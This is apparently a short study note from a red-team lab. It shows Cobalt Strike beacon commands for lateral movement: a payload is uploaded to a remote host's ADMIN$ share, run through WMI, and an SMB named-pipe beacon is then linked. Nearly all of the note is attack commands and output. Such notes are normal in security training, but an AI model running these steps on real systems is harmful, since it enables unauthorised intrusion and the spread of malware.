
## WMI
```
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
```

Second argument is the pipe we assigned to the listener

![[Pasted image 20230330114217.png]]
```
link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```